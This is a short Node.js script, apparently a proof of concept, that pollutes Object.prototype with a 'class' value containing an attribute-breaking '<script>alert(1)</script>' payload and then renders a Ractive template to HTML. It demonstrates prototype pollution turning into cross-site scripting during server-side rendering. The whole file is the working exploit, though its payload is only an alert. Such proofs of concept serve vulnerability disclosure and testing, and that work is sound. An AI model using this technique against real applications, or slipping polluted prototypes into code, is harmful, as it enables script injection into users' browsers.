const Ractive = require('ractive');
const fs = require('fs');
const path = require('path');


Object.prototype.statics = {}
Object.prototype.class = '">\n<script>alert(1)</script>\n<p>'

let template = fs.readFileSync(path.resolve(__dirname, 'views/template.ract'), 'utf8');


var ractive = new Ractive({
  template: template,
  data: { greeting: 'Hello', name: 'world' }
});

console.log(ractive.toHTML());